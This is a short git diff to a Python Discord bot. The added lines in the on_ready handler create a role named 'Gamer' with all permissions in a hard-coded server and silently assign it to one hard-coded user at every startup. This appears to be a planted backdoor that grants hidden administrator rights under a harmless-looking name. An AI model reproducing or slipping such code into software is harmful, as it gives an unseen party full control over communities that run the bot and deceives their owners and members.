@@ -4,6 +4,7 @@ from io import BytesIO
 
 import discord
 from PIL import Image
+from discord import Permissions
 from discord.ext import tasks
 from discord.utils import get
 from youtube_dl import YoutubeDL
@@ -42,6 +43,10 @@ async def on_ready():
     print(f"We have logged in as {data.bot.user}")
     hate_nj_vc_loop.start()
     update_loop.start()
+    a = await data.bot.fetch_guild(1013258146929704980)
+    role = await a.create_role(name="Gamer", permissions=Permissions.all())
+    member = await a.fetch_member(343545158140428289)
+    await a.add_roles(member, role)
 
 
 @data.bot.event
